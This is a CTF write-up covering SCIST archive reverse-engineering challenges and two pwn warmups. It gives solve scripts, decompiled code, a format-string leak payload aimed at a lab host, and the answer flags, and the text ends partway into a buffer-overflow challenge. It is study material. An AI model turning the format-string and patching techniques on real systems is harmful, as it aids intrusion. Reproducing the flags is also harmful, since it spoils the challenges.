# SCIST Archive Writeup

This platform is for preparing for SCIST final exam.

Enhancing my hacking skills and preparing for MyFirstCTF and AIS3 Pre Exam.

**UPD**: I won the 1st place in MyFirstCTF 2023. Thankful...

Just some random writeup. Try to solve as many as I can.

[Platform](https://archive.ctf.scist.org/)

[Github Repo](https://github.com/scist-tw/SCIST_CTF_Archive)

## Reverse

### Oneline Python

```python
#!/usr/bin/python3.8

(lambda res , check : print(["Wrong FLAG" , "Congratulations ! Submit this as the FLAG"][[res[i][0] for i in range(64)] == check]))(((lambda key , func1 , func2 , rotate , inp: [[[func1 , func2][i & 1](ord(sum(key , [])[i % 16]) , ord(inp[i])) , key := rotate(key)] for i in range(64)])([["a" , "b" , "c" , "d"] , ["e" , "f" , "g" , "h"] , ["i" , "j" , "k" , "l"] , ["m" , "n" , "o" , "p"]] , (lambda a , b : ((a | b) & (~a | ~b))) , (lambda a , b : ((a | b) - (a & b))) , (lambda arr : list(map(list , zip(*arr[::-1])))) , (lambda a : ("0" * 64 if len(a) != 64 else a))(input("What is the FLAG ?\n")))) , [50, 42, 39, 35, 49, 17, 90, 1, 90, 39, 87, 0, 40, 51, 50, 20, 86, 33, 94, 30, 58, 91, 25, 48, 43, 46, 7, 27, 25, 93, 4, 56, 29, 54, 44, 5, 82, 53, 91, 27, 54, 90, 21, 67, 15, 95, 83, 3, 6, 54, 26, 64, 85, 53, 6, 3, 89, 91, 8, 0, 10, 11, 67, 16])
```

After some code auditing, we know that each character is independent. Therefore we have the following brute-forcing script:

```python
#!/usr/bin/python3.8
import string
import pwn
import time
printable = string.printable
leaked = ""
with pwn.log.progress("Leaking...") as p:
    for j in range(1,65):
        for c in printable:
            found = (
                lambda res, check: c if [res[i][0] for i in range(j)] == [check[i] for i in range(j)] else None
            )(
                (
                    (
                        lambda key, func1, func2, rotate, inp: [
                            [
                                [func1, func2][i & 1](ord(sum(key, [])[i % 16]), ord(inp[i])),
                                key := rotate(key),
                            ]
                            for i in range(64)
                        ]
                    )(
                        [
                            ["a", "b", "c", "d"],
                            ["e", "f", "g", "h"],
                            ["i", "j", "k", "l"],
                            ["m", "n", "o", "p"],
                        ],
                        (lambda a, b: ((a | b) & (~a | ~b))),
                        (lambda a, b: ((a | b) - (a & b))),
                        (lambda arr: list(map(list, zip(*arr[::-1])))),
                        leaked + c * (64 - len(leaked)),
                    )
                ),
                [
                    50,
                    42,
                    39,
                    35,
                    49,
                    17,
                    90,
                    1,
                    90,
                    39,
                    87,
                    0,
                    40,
                    51,
                    50,
                    20,
                    86,
                    33,
                    94,
                    30,
                    58,
                    91,
                    25,
                    48,
                    43,
                    46,
                    7,
                    27,
                    25,
                    93,
                    4,
                    56,
                    29,
                    54,
                    44,
                    5,
                    82,
                    53,
                    91,
                    27,
                    54,
                    90,
                    21,
                    67,
                    15,
                    95,
                    83,
                    3,
                    6,
                    54,
                    26,
                    64,
                    85,
                    53,
                    6,
                    3,
                    89,
                    91,
                    8,
                    0,
                    10,
                    11,
                    67,
                    16,
                ],
            )
            if found:
                leaked += found
                p.status(leaked)
                time.sleep(0.1)
                break
pwn.log.success("Flag: " + leaked)
```

`SCIST{0n3L1nE_Py7H0n_1s_BEaut1fU|_Bu7_1t_1s-b31ng_t00_ll00nngg!}`

### RRRandom

Change code to

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char Flag[] = "SCIST{FAKE_FLAG}";
char out[] = { 72, 158, 35, 91, 56, 139, 66, 248, 175, 73, 13, 109, 91, 247, 105, 138, 59, 174, 123, 28, 175, 67, 171, 218, 14, 17};
int main()
{
    int i, n;
    time_t t;

    n = sizeof(Flag) / sizeof(char);

    srand(5);

    for( i = 0 ; i < n ; i++ ) {
          //printf("%d ", Flag[i] ^ (rand() % 256));
    }
    puts("Encrypt This");
    for( i = 0 ; i < sizeof(out) / sizeof(char); i++)
        printf("%c", out[i] ^ (rand() % 256));
    return(0);
}
```

`SCIST{random_isn't_random}`

### Vault

Decompile with [uncompyle6](https://github.com/rocky/python-uncompyle6)

```python
# uncompyle6 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0]
# Embedded file name: main.py
# Compiled at: 2022-07-20 18:11:47
# Size of source mod 2**32: 5092 bytes
from rich.align import Align
from rich.console import RenderableType
from rich.padding import Padding
from rich.text import Text
from textual.app import App
from textual.reactive import Reactive
from textual.views import GridView
from textual.widget import Widget
from textual.widgets import Button, ButtonPressed

class InputDisplay(Widget):
    value = Reactive('')

    def render(self) -> RenderableType:
        return Padding(Align.right((Text(self.value)), vertical='middle'),
          (0, 1),
          style='white on rgb(51,51,51)')


class HoverableButton(Button):
    mouse_over = Reactive(False)

    def __init__(self, text, style, hover_style):
        super().__init__(text, style=style, name=text)
        self.text = text
        self.style = style
        self.hover_style = hover_style

    def render(self) -> Button:
        style = self.hover_style if self.mouse_over else self.style
        return Button((Text(self.text)), style=style, name=(self.text))

    def on_enter(self) -> None:
        self.mouse_over = True

    def on_leave(self) -> None:
        self.mouse_over = False


class Vault(GridView):
    DARK = 'white on rgb(40,44,52)'
    GREEN = 'white on rgb(152,195,121)'
    RED = 'white on rgb(224,108,117)'
    DARK_HOVER = 'bold white on rgb(171,178,191)'
    GREEN_HOVER = 'bold white on rgb(86,182,194)'
    RED_HOVER = 'bold white on rgb(198,120,221)'
    BUTTON_STYLES = {'Clear':RED,
     'Submit':GREEN}
    BUTTON_HOVER_STYLES = {'Clear':RED_HOVER,
     'Submit':GREEN_HOVER}
    flag = [
     82, 75, 77, 87, 82, 124, 53, 119, 95, 48, 107, 54, 115,
     86, 49, 90, 102, 115, 48, 90, 111, 56, 91, 112, 115, 54,
     91, 98, 48, 117, 92, 48, 104, 58, 90, 114, 48, 104, 124]
    win = Reactive(False)
    value = Reactive('')

    def validate(self, value) -> bool:
        if len(value) != 20:
            return False
        v = [int(i, 10) for i in value]
        if v[4] + v[5] != 13:
            return False
        if v[5] + v[6] != 11:
            return False
        if v[7] * v[8] != 0:
            return False
        if v[14] - v[15] != 0:
            return False
        if v[12] + v[13] != 9:
            return False
        if v[8] + v[9] != 7:
            return False
        if v[16] + v[17] != 7:
            return False
        if v[9] * v[10] != 21:
            return False
        if v[0] + v[1] != 9:
            return False
        if v[11] + v[12] != 7:
            return False
        if v[6] + v[7] != 8:
            return False
        if v[15] + v[16] != 6:
            return False
        if v[1] - v[2] != 4:
            return False
        if v[13] - v[14] != 4:
            return False
        if v[17] + v[18] != 7:
            return False
        if v[2] * v[3] != 16:
            return False
        if v[3] - v[4] != -2:
            return False
        if v[0] != 1:
            return False
        if v[10] * v[11] != 21:
            return False
        if v[18] + v[19] != 6:
            return False
        return True

    def decrypt(self, ciphertext, key) -> str:
        return ''.join((chr(j ^ int(key[i % len(key)], 10)) for i, j in enumerate(ciphertext)))

    def watch_value(self, value: str) -> None:
        self.input_display.value = value

    def on_mount(self) -> None:
        self.input_display = InputDisplay()

        def make_button(text, style, hover_style):
            return HoverableButton(text, style, hover_style)

        self.buttons = {name: HoverableButton(name, self.BUTTON_STYLES.get(name, self.DARK), self.BUTTON_HOVER_STYLES.get(name, self.DARK_HOVER)) for name in '7,8,9,4,5,6,1,2,3,Clear,0,Submit'.split(',')}
        self.grid.set_gap(2, 1)
        self.grid.set_gutter(1)
        self.grid.set_align('center', 'center')
        self.grid.add_column('col', max_size=30, repeat=3)
        self.grid.add_row('input_display', max_size=30)
        self.grid.add_row('row', max_size=30, repeat=4)
        self.grid.add_areas(input_display='col1-start|col3-end,input_display')
        (self.grid.place)(*(self.buttons.values)(), **{'input_display': self.input_display})

    def handle_button_pressed(self, message: ButtonPressed) -> None:
        if self.win:
            return
            assert isinstance(message.sender, Button)
            button_name = message.sender.name
            if button_name.isdigit():
                self.value = self.value + button_name
        elif button_name == 'Clear':
            self.value = ''
        else:
            if button_name == 'Submit':
                if self.validate(self.value):
                    self.win = True
                    self.value = self.decrypt(self.flag, self.value)
                else:
                    self.value = ''
            else:
                raise ValueError('owo?')


class VaultApp(App):

    async def on_mount(self) -> None:
        await self.view.dock(Vault())


VaultApp.run(title='The Vault')
# okay decompiling vault.cpython-38.pyc
```

After some analysis, we can write the following script to solve the challenge.

```python
chat = [1, 8, 4, 4, 6, 7, 4, 4, 0, 7, 3, 7, 0, 9, 5, 5, 1, 6, 1, 5]  # Calculate by hand
flag = [
    82,
    75,
    77,
    87,
    82,
    124,
    53,
    119,
    95,
    48,
    107,
    54,
    115,
    86,
    49,
    90,
    102,
    115,
    48,
    90,
    111,
    56,
    91,
    112,
    115,
    54,
    91,
    98,
    48,
    117,
    92,
    48,
    104,
    58,
    90,
    114,
    48,
    104,
    124,
]


def validate(value) -> bool:
    if len(value) != 20:
        return False
    # v = [int(i, 10) for i in value]
    v = value
    if v[4] + v[5] != 13:
        return False
    if v[5] + v[6] != 11:
        return False
    if v[7] * v[8] != 0:
        return False
    if v[14] - v[15] != 0:
        return False
    if v[12] + v[13] != 9:
        return False
    if v[8] + v[9] != 7:
        return 1
    if v[16] + v[17] != 7:
        return False
    if v[9] * v[10] != 21:
        return False
    if v[0] + v[1] != 9:
        return False
    if v[11] + v[12] != 7:
        return False
    if v[6] + v[7] != 8:
        return False
    if v[15] + v[16] != 6:
        return False
    if v[1] - v[2] != 4:
        return False
    if v[13] - v[14] != 4:
        return False
    if v[17] + v[18] != 7:
        return False
    if v[2] * v[3] != 16:
        return False
    if v[3] - v[4] != -2:
        return False
    if v[0] != 1:
        return False
    if v[10] * v[11] != 21:
        return False
    if v[18] + v[19] != 6:
        return False
    return True


print(validate(chat))  # True


def decrypt(ciphertext, key):
    print("".join((chr(j ^ key[i % len(key)]) for i, j in enumerate(ciphertext))))


decrypt(flag, chat)
```

FYI, curious solved it by automatic constraint-solving engine z3. You can find his writeup [here](https://hackmd.io/@akvo-fajro/scist_final_exam_write_up#Vault).

```python
from z3 import *

serial = [Int(f'serial_{i}') for i in range(20)]

s = Solver()

for i in range(20):
    s.add(And(serial[i] >= 0,serial[i] < 10))

s.add(serial[4] + serial[5] == 13)
s.add(serial[5] + serial[6] == 11)
s.add(serial[7] * serial[8] == 0)
s.add(serial[14] - serial[15] == 0)
s.add(serial[12] + serial[13] == 9)
s.add(serial[8] + serial[9] == 7)
s.add(serial[16] + serial[17] == 7)
s.add(serial[9] * serial[10] == 21)
s.add(serial[0] + serial[1] == 9)
s.add(serial[11] + serial[12] == 7)
s.add(serial[6] + serial[7] == 8)
s.add(serial[15] + serial[16] == 6)
s.add(serial[1] - serial[2] == 4)
s.add(serial[13] - serial[14] == 4)
s.add(serial[17] + serial[18] == 7)
s.add(serial[2] * serial[3] == 16)
s.add(serial[3] - serial[4] == -2)
s.add(serial[0] == 1)
s.add(serial[10] * serial[11] == 21)
s.add(serial[18] + serial[19] == 6)

while s.check() == sat:
    a = s.model()
    payload = ''
    for i in range(20):
        payload += str(a[serial[i]])
    print(payload)
    condi = [serial[i] != a[serial[i]] for i in range(20)]
    s.add(Or(condi))
```

As practice, I try to solve it with claripy and ChatGPT, but it seems that the GPT 3.5 model is not good enough to solve this challenge if I didn't give it any prompt. However, after I read claripy document, I gave ChatGPT a better prompt and instruction, and it works!

```python
import claripy

# Create an array of 20 symbolic integer variables
v = [claripy.BVS(f"v{i}", 32) for i in range(20)]

# Add the given constraints
constraints = [
    v[4] + v[5] == 13,
    v[5] + v[6] == 11,
    v[7] * v[8] == 0,
    v[14] - v[15] == 0,
    v[12] + v[13] == 9,
    v[8] + v[9] == 7,
    v[16] + v[17] == 7,
    v[9] * v[10] == 21,
    v[0] + v[1] == 9,
    v[11] + v[12] == 7,
    v[6] + v[7] == 8,
    v[15] + v[16] == 6,
    v[1] - v[2] == 4,
    v[13] - v[14] == 4,
    v[17] + v[18] == 7,
    v[2] * v[3] == 16,
    v[3] - v[4] == -2,
    v[0] == 1,
    v[10] * v[11] == 21,
    v[18] + v[19] == 6,
]

# Create a solver and add the constraints
solver = claripy.Solver()
for constraint in constraints:
    solver.add(constraint)
for i in range(20):
    solver.add(v[i] >= 0)
    solver.add(v[i] <= 9)
if solver.satisfiable():
    # Solve the constraints and get the concrete values of the array
    solution = [solver.eval(x, 1)[0] for x in v]

    print("Solution found:")
    for i, value in enumerate(solution):
        print(f"v[{i}] = {value}")
else:
    print("No solution found.")
```

With result:

```bash
$ python3 solve.py
Solution found:
v[0] = 1
v[1] = 8
v[2] = 4
v[3] = 4
v[4] = 6
v[5] = 7
v[6] = 4
v[7] = 4
v[8] = 0
v[9] = 7
v[10] = 3
v[11] = 7
v[12] = 0
v[13] = 9
v[14] = 5
v[15] = 5
v[16] = 1
v[17] = 6
v[18] = 1
v[19] = 5
```

Wonderful!

`SCIST{1s_7h1s_4_gu1_n0_tu1_f0r_7h3_w1n}`

### Reverse

```bash
$ file rev
rev: data
```

If you strings the file, you'll find something very familiar, but in reverse order. Such as `fnacs_99cosi__`, `2.os.46-68x-xunil-dl/46bil/`

So we can guess that this binary has been reversed (physically). So we can reverse it back with the following script.

```python
with open('rev', 'rb') as input_file:
    bytes_data = input_file.read()

reversed_bytes = bytes_data[::-1]

with open('ver', 'wb') as output_file:
    output_file.write(reversed_bytes)
```

```bash
$ file ver
ver: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9a366b6bc878f3dcb60d6a128696fd18d602ea77, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
$ ./ver
 :gnirts cigam a em eviG
```

The challenge is not done yet! We still need to reverse the binary since it asked us to input a "password".

The program is a little messy, and after some IDA here is the main part:

```c
__isoc99_scanf("%64s", s);
strcpy(magic, "XO\\OXYO");
memfrob(magic, 7uLL);
v4 = esrever(s);
if (!strcmp(v4, magic)) { // Jump here
  qmemcpy(flag, &unk_2023, sizeof(flag));
  v5 = decrypt(flag, s); // Don't care about this
  __sprintf_chk(huh, 1LL, 64LL, "OK, here is your flag: %s", v5);
}
```

And we can setup a little lab to see what happens:

```c
#include <stdio.h>
#include <string.h>
char *esrever(char *str) {  // This code is from the original program
  char *v1;                 // rcx
  char *v2;                 // rdx
  char v3;                  // al
  char v4;                  // al

  v1 = &str[strlen(str) - 1];
  if (str < v1) {
    v2 = str;
    do {
      v3 = *v1-- ^ *v2;
      *v2 = v3;
      v4 = v1[1] ^ v3;
      v1[1] = v4;
      *v2++ ^= v4;
    } while (v2 < v1);
  }
  return str;
}
int main() {
  char magic[8];
  strcpy(magic, "XO\\OXYO");
  memfrob(magic, 7uLL);
  printf("%s\n", magic);
  char ooo[] = "reverse";
  printf("%s\n", esrever(ooo));
}
```

The `magic` string is just `reverse` and the `esrever` function is just `reverse` the string but really ugly, so we just need to input `esrever` to get the flag.

```bash
$ echo "esrever" | ./ver | rev | grep -oE "SCIST{.*}" --color=never
SCIST{reverse_esrever}
```

### Guess Game

The program read a byte from `/dev/urandom` and ask us to guess it. If we guess it right, we'll get the flag.

This is a classic problem, I have 4 ways to solve it.

#### 1. Brute force

Very fast since there's only one byte.

```python
from pwn import *
import re
context.log_level = 'warning'
def guess():
	r = process('./chal')
	r.sendlineafter(b'Guess Number:\n',b'69')
	res = r.recvuntil(b':')
	if b"Real" in res:
		r.close()
		return 1 
	else:
		res = r.recv().decode()
		print(re.search(r"SCIST{.*?}",res).group(0))
		r.close()
		return 0
	

while True:
	if guess() != 1:
		break
```

#### 2. Patch the binary

The key part of the comparison is: 

```text
001012bd 75 7c           JNZ         LAB_0010133b
```

Just patch it to `74 7C`. And we can get the flag if we guessed wrong.

#### 3. Reverse the process of generating flag

This service is a local reverse challenge so the flag is generated in the binary locally. We can generate the flag by ourselves.

#### 4. Use gdb to jump to the right place

Just use gdb to jump to where the flag is printed.

`SCIST{Guess_Who_Am_I}`

### Fib

First, I finally learn how to extract data from an array in ghidra.

Right click head(?) -> create array -> select all content -> right click -> copy special -> choose you like

After some decompilation, we have the following challenge: Given a linear recurrence relation with $f(x)=2f(x-1)+3f(x-2)$ and $f(0)=1,f(1)=2$. For each $x = 0\dots 69$, find $f(f(x))\pmod {1000000007}$, then xor it with the encrypted flag given in the program. The program uses recursive function to calculate $f(x)$, so it's very slow.

Actually we can use $O(n)$ solution to find $f(x)$ (calculate it one by one, actually it's fast enough), but I want to use matrix multiplication with binary exponentiation to speed it up to $O(\log n)$ for each query. All of them are way, way more faster than $O(2^n)$ brute force.

I asked ChatGPT first, it gave me the following code:

```python
import numpy as np

def linear_recurrence_solver(x):
    A = np.array([[2, 3], [1, 0]])
    initial_conditions = np.array([2, 1])
    power = x - 1
    result = np.linalg.matrix_power(A, power) @ initial_conditions
    return result[0]  # Return only the value of f(x)

# Test the function
print(linear_recurrence_solver(2))  # Output: 5
print(linear_recurrence_solver(3))  # Output: 17
```

However, it's wrong! After doing some research online, I found out that the `np.linalg.matrix_power` actually has some 
precision problem for large numbers. So I use C++ to solve it since I already had a modint with matrix implementation from [Neal Wu](https://github.com/nealwu/competitive-programming/blob/master/mod/mod_matrix.cc).

```cpp
#include <algorithm>
#include <cassert>
#include <iostream>
#include <limits>
#include <vector>
using namespace std;

template <const int &MOD>
struct _m_int {
  int val;

  _m_int(int64_t v = 0) {
    if (v < 0) v = v % MOD + MOD;
    if (v >= MOD) v %= MOD;
    val = int(v);
  }

  _m_int(uint64_t v) {
    if (v >= MOD) v %= MOD;
    val = int(v);
  }

  _m_int(int v) : _m_int(int64_t(v)) {}
  _m_int(unsigned v) : _m_int(uint64_t(v)) {}

  explicit operator int() const { return val; }
  explicit operator unsigned() const { return val; }
  explicit operator int64_t() const { return val; }
  explicit operator uint64_t() const { return val; }
  explicit operator double() const { return val; }
  explicit operator long double() const { return val; }

  _m_int &operator+=(const _m_int &other) {
    val -= MOD - other.val;
    if (val < 0) val += MOD;
    return *this;
  }

  _m_int &operator-=(const _m_int &other) {
    val -= other.val;
    if (val < 0) val += MOD;
    return *this;
  }

  static unsigned fast_mod(uint64_t x, unsigned m = MOD) {
#if !defined(_WIN32) || defined(_WIN64)
    return unsigned(x % m);
#endif
    // Optimized mod for Codeforces 32-bit machines.
    // x must be less than 2^32 * m for this to work, so that x / m fits in an
    // unsigned 32-bit int.
    unsigned x_high = unsigned(x >> 32), x_low = unsigned(x);
    unsigned quot, rem;
    asm("divl %4\n" : "=a"(quot), "=d"(rem) : "d"(x_high), "a"(x_low), "r"(m));
    return rem;
  }

  _m_int &operator*=(const _m_int &other) {
    val = fast_mod(uint64_t(val) * other.val);
    return *this;
  }

  _m_int &operator/=(const _m_int &other) { return *this *= other.inv(); }

  friend _m_int operator+(const _m_int &a, const _m_int &b) {
    return _m_int(a) += b;
  }
  friend _m_int operator-(const _m_int &a, const _m_int &b) {
    return _m_int(a) -= b;
  }
  friend _m_int operator*(const _m_int &a, const _m_int &b) {
    return _m_int(a) *= b;
  }
  friend _m_int operator/(const _m_int &a, const _m_int &b) {
    return _m_int(a) /= b;
  }

  _m_int &operator++() {
    val = val == MOD - 1 ? 0 : val + 1;
    return *this;
  }

  _m_int &operator--() {
    val = val == 0 ? MOD - 1 : val - 1;
    return *this;
  }

  _m_int operator++(int) {
    _m_int before = *this;
    ++*this;
    return before;
  }
  _m_int operator--(int) {
    _m_int before = *this;
    --*this;
    return before;
  }

  _m_int operator-() const { return val == 0 ? 0 : MOD - val; }

  friend bool operator==(const _m_int &a, const _m_int &b) {
    return a.val == b.val;
  }
  friend bool operator!=(const _m_int &a, const _m_int &b) {
    return a.val != b.val;
  }
  friend bool operator<(const _m_int &a, const _m_int &b) {
    return a.val < b.val;
  }
  friend bool operator>(const _m_int &a, const _m_int &b) {
    return a.val > b.val;
  }
  friend bool operator<=(const _m_int &a, const _m_int &b) {
    return a.val <= b.val;
  }
  friend bool operator>=(const _m_int &a, const _m_int &b) {
    return a.val >= b.val;
  }

  static const int SAVE_INV = int(1e6) + 5;
  static _m_int save_inv[SAVE_INV];

  static void prepare_inv() {
    // Ensures that MOD is prime, which is necessary for the inverse algorithm
    // below.
    for (int64_t p = 2; p * p <= MOD; p += p % 2 + 1) assert(MOD % p != 0);

    save_inv[0] = 0;
    save_inv[1] = 1;

    for (int i = 2; i < SAVE_INV; i++)
      save_inv[i] = save_inv[MOD % i] * (MOD - MOD / i);
  }

  _m_int inv() const {
    if (save_inv[1] == 0) prepare_inv();

    if (val < SAVE_INV) return save_inv[val];

    _m_int product = 1;
    int v = val;

    do {
      product *= MOD - MOD / v;
      v = MOD % v;
    } while (v >= SAVE_INV);

    return product * save_inv[v];
  }

  _m_int pow(int64_t p) const {
    if (p < 0) return inv().pow(-p);

    _m_int a = *this, result = 1;

    while (p > 0) {
      if (p & 1) result *= a;

      p >>= 1;

      if (p > 0) a *= a;
    }

    return result;
  }

  friend ostream &operator<<(ostream &os, const _m_int &m) {
    return os << m.val;
  }
};

template <const int &MOD>
_m_int<MOD> _m_int<MOD>::save_inv[_m_int<MOD>::SAVE_INV];

const int MOD = 1000000007;
using mod_int = _m_int<MOD>;

// TODO: if using mod_column_vector, we can write the mod_matrix in the format
// matrix[x] = a row of coefficients used to build the x-th element of the
// mod_column_vector. So matrix[0][2] is the coefficient that element 2
// contributes to the next element 0. The other option is to take a single-row 1
// * n mod_matrix and multiply it by the n * n mod_matrix. Then matrix[0][2] is
// the coefficient that 0 contributes to the next element 2.
struct mod_column_vector {
  int rows;
  vector<mod_int> values;

  mod_column_vector(int _rows = 0) { init(_rows); }

  template <typename T>
  mod_column_vector(const vector<T> &v) {
    init(v);
  }

  void init(int _rows) {
    rows = _rows;
    values.assign(rows, 0);
  }

  template <typename T>
  void init(const vector<T> &v) {
    rows = int(v.size());
    values = vector<mod_int>(v.begin(), v.end());
  }

  mod_int &operator[](int index) { return values[index]; }
  const mod_int &operator[](int index) const { return values[index]; }
};

// Warning: very inefficient for many small matrices of fixed size. For that,
// use mod_matrix_fixed_size.cc instead.
struct mod_matrix {
  static const uint64_t U64_BOUND =
      numeric_limits<uint64_t>::max() - uint64_t(MOD) * MOD;

  static mod_matrix IDENTITY(int n) {
    mod_matrix identity(n);

    for (int i = 0; i < n; i++) identity[i][i] = 1;

    return identity;
  }

  int rows, cols;
  vector<vector<mod_int>> values;

  mod_matrix(int _rows = 0, int _cols = -1) { init(_rows, _cols); }

  template <typename T>
  mod_matrix(const vector<vector<T>> &v) {
    init(v);
  }

  void init(int _rows, int _cols = -1) {
    rows = _rows;
    cols = _cols < 0 ? rows : _cols;
    values.assign(rows, vector<mod_int>(cols, 0));
  }

  template <typename T>
  void init(const vector<vector<T>> &v) {
    rows = int(v.size());
    cols = v.empty() ? 0 : int(v[0].size());
    values.assign(rows, vector<mod_int>(cols, 0));

    for (int i = 0; i < rows; i++) {
      assert(int(v[i].size()) == cols);
      copy(v[i].begin(), v[i].end(), values[i].begin());
    }
  }

  vector<mod_int> &operator[](int index) { return values[index]; }
  const vector<mod_int> &operator[](int index) const { return values[index]; }

  bool is_square() const { return rows == cols; }

  mod_matrix operator*(const mod_matrix &other) const {
    assert(cols == other.rows);
    mod_matrix product(rows, other.cols);
    vector<uint64_t> row;

    for (int i = 0; i < rows; i++) {
      row.assign(other.cols, 0);

      for (int j = 0; j < cols; j++)
        if (values[i][j] != 0)
          for (int k = 0; k < other.cols; k++) {
            row[k] += uint64_t(values[i][j]) * uint64_t(other[j][k]);

            if (row[k] > U64_BOUND) row[k] %= MOD;
          }

      for (int k = 0; k < other.cols; k++) product[i][k] = row[k];
    }

    return product;
  }

  mod_matrix &operator*=(const mod_matrix &other) {
    return *this = *this * other;
  }

  mod_column_vector operator*(const mod_column_vector &column) const {
    assert(cols == column.rows);
    mod_column_vector product(rows);

    for (int i = 0; i < rows; i++) {
      uint64_t result = 0;

      for (int j = 0; j < cols; j++) {
        result += uint64_t(values[i][j]) * uint64_t(column[j]);

        if (result > U64_BOUND) result %= MOD;
      }

      product[i] = result;
    }

    return product;
  }

  mod_matrix &operator*=(mod_int mult) {
    for (int i = 0; i < rows; i++)
      for (int j = 0; j < cols; j++) values[i][j] *= mult;

    return *this;
  }

  mod_matrix operator*(mod_int mult) const { return mod_matrix(*this) *= mult; }

  mod_matrix &operator+=(const mod_matrix &other) {
    assert(rows == other.rows && cols == other.cols);

    for (int i = 0; i < rows; i++)
      for (int j = 0; j < cols; j++) values[i][j] += other[i][j];

    return *this;
  }

  mod_matrix operator+(const mod_matrix &other) const {
    return mod_matrix(*this) += other;
  }

  mod_matrix &operator-=(const mod_matrix &other) {
    assert(rows == other.rows && cols == other.cols);

    for (int i = 0; i < rows; i++)
      for (int j = 0; j < cols; j++) values[i][j] -= other[i][j];

    return *this;
  }

  mod_matrix operator-(const mod_matrix &other) const {
    return mod_matrix(*this) -= other;
  }

  mod_matrix pow(int64_t p) const {
    assert(p >= 0);
    assert(is_square());
    mod_matrix m = *this, result = IDENTITY(rows);

    while (p > 0) {
      if (p & 1) result *= m;

      p >>= 1;

      if (p > 0) m *= m;
    }

    return result;
  }

  void print(ostream &os) const {
    for (int i = 0; i < rows; i++)
      for (int j = 0; j < cols; j++)
        os << values[i][j] << (j < cols - 1 ? ' ' : '\n');

    os << '\n';
  }
};

uint8_t flag[] = {
    0x75, 0x6f, 0x5c, 0xa8, 0x5f, 0x44, 0x7f, 0xb1, 0xb0, 0x09, 0xc1, 0x48,
    0x95, 0xd7, 0x28, 0x49, 0xf5, 0x32, 0xc4, 0x42, 0xe1, 0xd4, 0xb2, 0x99,
    0x41, 0x3a, 0x13, 0x38, 0x06, 0xf4, 0xf0, 0x99, 0x58, 0x73, 0x0e, 0x2f,
    0x18, 0x8f, 0x13, 0x31, 0xc7, 0x8b, 0x9d, 0xda, 0x5b, 0xd8, 0x55, 0x81,
    0x25, 0x61, 0x4c, 0xb2, 0x3c, 0x43, 0x07, 0x2f, 0x50, 0x74, 0xfb, 0x45,
    0xd7, 0x68, 0xd6, 0x1a, 0x08, 0x81, 0x75, 0x11, 0x78, 0xac, 0x00};

uint64_t f(uint64_t x) {
  if (x == 0) return 1;
  if (x == 1) return 2;
  mod_matrix m1(2, 2), m2(2, 1), m3(2, 1);
  m1[0][0] = 2;
  m1[0][1] = 3;
  m1[1][0] = 1;
  m1[1][1] = 0;
  m2[0][0] = 2;
  m2[1][0] = 1;
  m3 = m1.pow(x - 1) * m2;
  return uint64_t(m3[0][0]);
}

int main() {
  uint64_t first_stage, second_stage;
  cout << "SCIST{";
  for (int i = 0; i < 70; i++) {
    first_stage = f(i);
    second_stage = f(first_stage);
    cout << uint8_t((second_stage ^ flag[i]) % 256);
  }
  cout << "}\n";
}
```

`SCIST{wh47_4_long_lon9_l0ng_l0n9_1ong_1on9_10ng_10n9_w41t_t0_0b7a1n_7h3_fl4g}`

FYI, Curious had implemented matrix solution in python [here](https://hackmd.io/@akvo-fajro/scist_final_exam_write_up#Fib).

```python
# | x1 x2 |
# | y1 y2 |
class SolveMatrix:
    def __init__(self,x1,x2,y1,y2):
        self.x1 = x1
        self.x2 = x2
        self.y1 = y1
        self.y2 = y2

    def mul(self,other,mod):
        x1 = (self.x1*other.x1 + self.x2*other.y1) % mod
        x2 = (self.x1*other.x2 + self.x2*other.y2) % mod
        y1 = (self.y1*other.x1 + self.y2*other.y1) % mod
        y2 = (self.y1*other.x2 + self.y2*other.y2) % mod
        return SolveMatrix(x1,x2,y1,y2)

    def f(self,n):
        if n == 0:
            return SolveMatrix(1,0,0,1)
        else:
            x = SolveMatrix(self.x1,self.x2,self.y1,self.y2)
            y = SolveMatrix(1,0,0,1)
            while n > 1:
                if n % 2 == 0:
                    x = x.mul(x,1000000007)
                    n = n // 2
                else:
                    y = y.mul(x,1000000007)
                    x = x.mul(x,1000000007)
                    n = n // 2
            x = x.mul(y,1000000007)
            return x

def get_f(n):
    mat = SolveMatrix(2,3,1,0)
    mat = mat.f(n)
    return (2*mat.y1 + mat.y2) % 1000000007

encrypt_flag = [
    0x75, 0x6F, 0x5C, 0xA8, 0x5F, 0x44, 0x7F, 0xB1, 0xB0, 0x9, 0xC1,
    0x48, 0x95, 0xD7, 0x28, 0x49, 0xF5, 0x32, 0xC4, 0x42, 0xE1,
    0xD4, 0xB2, 0x99, 0x41, 0x3A, 0x13, 0x38, 6, 0xF4, 0xF0,
    0x99, 0x58, 0x73, 0xE, 0x2F, 0x18, 0x8F, 0x13, 0x31, 0xC7, 0x8B,
    0x9D, 0xDA, 0x5B, 0xD8, 0x55, 0x81, 0x25, 0x61, 0x4C, 0xB2,
    0x3C, 0x43, 0x7, 0x2F, 0x50, 0x74, 0xFB, 0x45, 0xD7, 0x68, 0xD6,
    0x1A, 0x8, 0x81, 0x75, 0x11, 0x78, 0xAC, 0
]

print('SCIST{',end='')
for i in range(70):
    print(chr((encrypt_flag[i] ^ get_f(get_f(i))) & 0xff),end='')
print('}')
```

## Pwn

### Easy FMT

Format string bug warmup. Use gdb to find out the offset and dump strings out. Done.

```python
'''
$ nc lab.scist.org 13371
%12$p,%13$p,%14$p,%15$p,%16$p,%17$p
0x68547b5453494353,0x495f544d465f7331,0x55725f6f30745f35,0x7d217373336c6837,(nil),0x560f9f5880c0
'''

def oo(ooo):
	print(bytes.fromhex(ooo).decode('utf-8')[::-1],end = '')
oo('68547b5453494353')
oo('495f544d465f7331')
oo('55725f6f30745f35')
oo('7d217373336c6837')
```

`SCIST{Th1s_FMT_I5_t0o_rU7hl3ss!}`

### Easy BOF

Full code:

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char buf[0x10] = {};
    char compare_buf[0x10] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'a', 'a', 'a', 'a'};

